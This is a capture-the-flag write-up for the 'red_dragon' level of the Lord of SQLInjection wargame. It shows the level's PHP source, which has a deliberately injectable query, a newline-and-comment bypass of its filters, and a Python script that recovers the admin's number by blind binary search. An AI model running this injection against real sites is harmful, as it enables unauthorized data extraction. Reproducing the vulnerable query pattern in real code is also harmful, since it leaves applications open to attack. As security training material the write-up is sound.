# red_dragon

```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\./i', $_GET['id'])) exit("No Hack ~_~");
  if(strlen($_GET['id']) > 7) exit("too long string");
  $no = is_numeric($_GET['no']) ? $_GET['no'] : 1;
  $query = "select id from prob_red_dragon where id='{$_GET['id']}' and no={$no}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

  $query = "select no from prob_red_dragon where id='admin'"; // if you think challenge got wrong, look column name again.
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['no'] === $_GET['no']) solve("red_dragon");
  highlight_file(__FILE__);
?>
```
Here we have to get the admins `no` but id can have only 7 characters and no can only have numbers. So we commented from id and put a newline `%0a` on the no part to escape that and used a binary search algorithm to find the number. 

```python
import requests

session = requests.Session()
cookies = {"PHPSESSID": "5s5vfpd5jpkhskvvl1f1t1nk6m"}


url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id='||no>%23&no=%0A"
mini = 100000000
maxi = 1000000000
while(maxi > mini):
    mid = int((maxi+mini)//2)
    r = requests.get(url+str(mid), cookies=cookies)
    if('Hello admin' in r.text[:150]):
        print("no>"+str(mid))
        if(maxi-mini > 1):
            mini = mid
        else:
            maxi = mini
    else:
        print("no<"+str(mid))
        maxi = mid
print(mid)
```

This will give the number